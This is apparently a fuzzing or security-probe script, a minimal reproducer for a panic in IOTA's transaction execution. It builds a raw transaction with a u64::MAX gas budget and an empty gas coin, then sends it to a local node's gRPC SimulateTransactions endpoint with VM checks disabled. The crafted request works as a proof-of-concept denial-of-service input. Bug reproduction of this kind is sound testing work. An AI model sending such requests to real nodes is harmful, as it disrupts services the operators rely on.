#!/usr/bin/env bash
# Probe (CONFIRMED PANIC): Minimal reproducer for a panic in
# iota-execution programmable_transactions/context.rs:197
#   "Transaction input checker should check that there is enough gas"
#
# Vector: gRPC SimulateTransactions with DISABLE_VM_CHECKS (=0) enabled
# and gas_budget greater than the (empty) gas-coin balance. The
# simulator's "no VM checks" mode skips the gas check normally performed
# by the transaction input checker; the execution context then panics
# when subtracting `gas_budget` from a zero-balance gas coin.
#
# Effect on a debug build: panic with a backtrace is logged on the node;
# the gRPC connection is reset (RST_STREAM with CANCELLED). Tokio task
# isolation keeps the process alive, but the panic spam still pollutes
# logs and indicates the invariant_violation is reachable.
#
# Effect on a release build: `invariant_violation!` (in iota-types
# error.rs) downgrades to `return Err(...)` in non-debug, so a release
# binary returns a clean ExecutionError rather than panicking — but the
# logical bug (a "VM-check bypass" path that *also* skips the gas
# arithmetic precondition) remains.
set -u
HERE="$(dirname "$0")"
. "$HERE/lib.sh"

probe() {
  local name="$1"; shift
  local before
  before="$(log_line_count)"
  local out
  out="$(python3 -c "$1" 2>&1 || true)"
  echo "[panic_minimal/$name] result: $(printf '%s' "$out" | head -c 250)"
  if ! check_node_alive; then
    echo "[panic_minimal/$name] CRASHED"
    tail_log
    return 1
  fi
  if log_grew_with_panic "$before"; then
    echo "[panic_minimal/$name] PANIC LOGGED"
    tail -n $(( $(log_line_count) - before )) "$LOG" \
      | grep -E 'panicked at|stack overflow|fatal' | head -3
    return 2
  fi
  echo "[panic_minimal/$name] OK"
}

# Build the smallest possible TransactionData that triggers the panic.
HELPER='
import grpc
def varint(n):
    out=bytearray()
    while True:
        b=n & 0x7f
        n>>=7
        if n: out.append(b|0x80)
        else: out.append(b); break
    return bytes(out)
def tag(f,w): return varint((f<<3)|w)
def field_len(f,d): return tag(f,2)+varint(len(d))+d
def field_var(f,n): return tag(f,0)+varint(n)
'

probe "gas_budget_max_u64" "$HELPER"'
# Empty programmable transaction (no commands at all is not allowed, so
# we use Command::MakeMoveVec(None, [])).
b  = b"\x00"          # TransactionData::V1
b += b"\x00"          # TransactionKind::ProgrammableTransaction
b += b"\x00"          # inputs: 0
b += b"\x01"          # commands: 1
b += b"\x05"          # Command::MakeMoveVec
b += b"\x01"          # Option::Some
b += b"\x01"          # TypeInput::U8
b += b"\x00"          # Vec<Argument>: 0
b += b"\x00" * 32     # sender
b += b"\x00"          # GasData.payment: 0
b += b"\x00" * 32     # GasData.owner
b += (1000).to_bytes(8, "little")              # gas price (>= RGP)
b += (0xFFFFFFFFFFFFFFFF).to_bytes(8, "little") # gas budget = u64::MAX
b += b"\x00"          # TransactionExpiration::None

bcs = field_len(1, b)
tx  = field_len(2, bcs)                # Transaction { bcs: BcsData{data: ...} }
item = field_len(1, tx) + field_var(2, 0)  # tx_checks=DISABLE_VM_CHECKS
req = field_len(1, item)

ch = grpc.insecure_channel("127.0.0.1:50051")
m = ch.unary_unary(
    "/iota.grpc.v1.transaction_execution_service.TransactionExecutionService/SimulateTransactions"
)
try:
    out = m(req, timeout=15)
    print("ok bytes:", len(out))
except grpc.RpcError as e:
    print("rpc_error", e.code(), e.details()[:200])
ch.close()
'
